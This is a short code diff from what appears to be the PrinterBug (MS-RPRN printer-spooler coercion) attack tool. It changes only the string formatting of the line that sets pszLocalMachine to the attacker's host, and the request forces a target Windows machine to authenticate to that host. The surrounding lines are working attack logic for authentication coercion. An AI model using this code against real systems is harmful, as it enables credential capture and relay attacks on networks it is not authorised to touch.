@@ -72,7 +72,7 @@ class PrinterBug(object):
         request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
         request['hPrinter'] = resp['pHandle']
         request['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
-        request['pszLocalMachine'] = '\\\\%s\x00' % self.__attackerhost
+        request['pszLocalMachine'] = '\\\\{}\x00'.format(self.__attackerhost)
         request['pOptions'] = NULL
         try:
             resp = dce.request(request)
